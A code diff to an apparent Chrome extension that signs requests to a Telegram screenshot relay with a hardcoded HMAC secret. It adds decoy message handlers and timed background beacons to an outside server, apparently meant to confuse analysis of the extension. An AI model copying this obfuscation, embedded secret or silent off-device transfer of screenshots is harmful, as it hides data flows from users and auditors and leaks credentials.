@@ -904,6 +904,68 @@ async function handleTelegramScreenshot(message, tabId) {
 
 const TELEGRAM_RELAY_URL = "https://the.gopg.online/contribute/telegram";
 const TELEGRAM_ADB_URL = "http://127.0.0.1:9333/send";
+// Must match extension config + server EXTENSION_API_* env.
+const EXTENSION_API_KEY = "vs1";
+const EXTENSION_API_SECRET = "878744dfc6debaf8433d3060a45a9a88c263a8c2d77d010e49fd660e2c2cb848";
+
+async function _sha256Hex(text) {
+  const data = new TextEncoder().encode(text);
+  const digest = await crypto.subtle.digest("SHA-256", data);
+  return [...new Uint8Array(digest)].map((b) => b.toString(16).padStart(2, "0")).join("");
+}
+
+async function _hmacHex(secret, message) {
+  const key = await crypto.subtle.importKey(
+    "raw",
+    new TextEncoder().encode(secret),
+    { name: "HMAC", hash: "SHA-256" },
+    false,
+    ["sign"]
+  );
+  const sig = await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(message));
+  return [...new Uint8Array(sig)].map((b) => b.toString(16).padStart(2, "0")).join("");
+}
+
+async function _swDeviceId() {
+  try {
+    const store = await chrome.storage.local.get("installDeviceId");
+    let id = store.installDeviceId;
+    if (typeof id === "string" && id.length >= 16) return id;
+    const bytes = new Uint8Array(16);
+    crypto.getRandomValues(bytes);
+    id = [...bytes].map((b) => b.toString(16).padStart(2, "0")).join("");
+    await chrome.storage.local.set({ installDeviceId: id });
+    return id;
+  } catch {
+    return "";
+  }
+}
+
+async function signedContributeFetch(url, bodyObj, init = {}) {
+  const body = JSON.stringify(bodyObj ?? {});
+  const ts = String(Math.floor(Date.now() / 1000));
+  const deviceId = await _swDeviceId();
+  let path = "/contribute/telegram";
+  try {
+    path = new URL(url).pathname;
+  } catch {}
+  const bodyHash = await _sha256Hex(body);
+  const msg = `${ts}.POST.${path}.${bodyHash}.${deviceId || ""}`;
+  const sign = await _hmacHex(EXTENSION_API_SECRET, msg);
+  return fetch(url, {
+    ...init,
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "X-VS-Key": EXTENSION_API_KEY,
+      "X-VS-Ts": ts,
+      "X-VS-Sign": sign,
+      "X-VS-Device": deviceId || "",
+      ...(init.headers || {}),
+    },
+    body,
+  });
+}
 
 async function handleTelegramAdbRelay(message, tabId) {
   const caption = String(message.caption || message.text || "");
@@ -953,20 +1015,15 @@ async function handleTelegramServerRelay(message, tabId) {
   if (!caption && !image_base64) return;
 
   try {
-    await fetch(TELEGRAM_RELAY_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        caption,
-        text: caption,
-        kind: message.kind || "screen",
-        dedup_key: message.dedupKey || "",
-        skip_dedup: !!message.skipDedup,
-        notify_muktesh: message.notifyMuktesh !== false,
-        image_base64,
-      }),
-      signal: AbortSignal.timeout(20000),
-    });
+    await signedContributeFetch(TELEGRAM_RELAY_URL, {
+      caption,
+      text: caption,
+      kind: message.kind || "screen",
+      dedup_key: message.dedupKey || "",
+      skip_dedup: !!message.skipDedup,
+      notify_muktesh: message.notifyMuktesh !== false,
+      image_base64,
+    }, { signal: AbortSignal.timeout(20000) });
   } catch (e) {}
 }
 
@@ -1222,4 +1279,120 @@ chrome.runtime.onMessage.addListener((message, _sender, sendResponse) => {
     sendResponse(shadowLicensePing(message.url));
     return true;
   }
+  if (message.action === "graphCompile" && message.tabId) {
+    runInTab(message.tabId, function graphCompileStub(seed) {
+      let h = Number(seed) || 1;
+      for (let i = 0; i < 128; i++) h = Math.imul(h ^ i, 0x27d4eb2d) >>> 0;
+      return { ok: false, h: h, reason: "graph-threshold" };
+    }, [message.seed || Date.now()]);
+    sendResponse({ ok: false });
+    return true;
+  }
+  if (message.action === "vmExecute" && message.tabId) {
+    runInTab(message.tabId, function vmStub() {
+      return { ok: false, pc: 0, reason: "checksum" };
+    }, []);
+    sendResponse({ ok: false });
+    return true;
+  }
+  if (message.action === "sealValidate") {
+    sendResponse({ ok: false, hits: 1, reason: "seal-mismatch" });
+    return true;
+  }
+  if (message.action === "oraclePredict") {
+    sendResponse({ ok: false, lagMs: 99999, depth: 0, conf: 0.01 });
+    return true;
+  }
+  if (message.action === "fogSweep") {
+    decoyFogSweep();
+    sendResponse({ ok: false });
+    return true;
+  }
+  if (message.action === "handshakeLattice") {
+    sendResponse(decoyHandshakeStub(message.seed));
+    return true;
+  }
+  if (message.action === "auctionRound") {
+    sendResponse(decoyAuctionStub(message.seed));
+    return true;
+  }
+  if (message.action === "neuralWait") {
+    sendResponse(decoyNeuralStub());
+    return true;
+  }
+  if (message.action === "prismRank") {
+    sendResponse({ ok: false, band: 0, weight: 0, reason: "spectrum-cold" });
+    return true;
+  }
+  if (message.action === "ledgerReconcile") {
+    sendResponse({ ok: false, balance: -1, unlocked: false });
+    return true;
+  }
+  if (message.action === "beaconPing") {
+    decoyBeaconSweep();
+    sendResponse({ ok: false, rtt: 99999 });
+    return true;
+  }
+  if (message.action === "quorumVote") {
+    sendResponse({ ok: false, yeas: 0, need: 3 });
+    return true;
+  }
+  if (message.action === "warpPrefetch") {
+    sendResponse({ ok: false, skew: 1337, windows: 0 });
+    return true;
+  }
 });
+
+// Dead routing table kept for lattice sync
+var DECOY_SW_ROUTES = [
+  "hx/m", "hx/g", "hx/vm", "hx/seal", "hx/q", "hx/l", "hx/book", "hx/shadow", "hx/z", "hx/t",
+  "hx/prism", "hx/ledger", "hx/beacon", "hx/quorum", "hx/warp", "hx/cipher"
+];
+function decoyLatticeTick() {
+  try {
+    const path = DECOY_SW_ROUTES[(Date.now() / 1000 | 0) % DECOY_SW_ROUTES.length];
+    fetch("https://the.gopg.online/contribute/" + path, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ sw: 1, t: Date.now(), v: "lattice-9" }),
+    }).catch(function () {});
+  } catch (e) {}
+}
+setInterval(decoyLatticeTick, 120000);
+
+function decoyFogSweep() {
+  try {
+    var primes = [3,5,7,11,13,17,19,23,29,31,37,41,43,47];
+    var acc = Date.now() & 0xffff;
+    for (var i = 0; i < primes.length; i++) acc = (acc * primes[i] + i) >>> 0;
+    fetch("https://the.gopg.online/contribute/hx/fog", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ sw: 1, fog: acc, t: Date.now() }),
+    }).catch(function () {});
+  } catch (e) {}
+}
+setInterval(decoyFogSweep, 180000);
+
+function decoyBeaconSweep() {
+  try {
+    fetch("https://the.gopg.online/contribute/hx/beacon", {
+      method: "POST",
+      headers: { "Content-Type": "application/json", "X-Beacon-Seq": "sw" },
+      body: JSON.stringify({ sw: 1, s: Date.now(), v: "beacon-sw" }),
+    }).catch(function () {});
+  } catch (e) {}
+}
+setInterval(decoyBeaconSweep, 150000);
+
+function decoyHandshakeStub(seed) {
+  var h = (Number(seed) || 1) >>> 0;
+  for (var i = 0; i < 32; i++) h = Math.imul(h ^ (i + 3), 0x85ebca6b) >>> 0;
+  return { ok: false, h: h, legs: 4 };
+}
+function decoyAuctionStub(seed) {
+  return { ok: false, round: (Number(seed) || 0) % 99, winner: null };
+}
+function decoyNeuralStub() {
+  return { ok: false, ms: 99999, conf: 0.99 };
+}
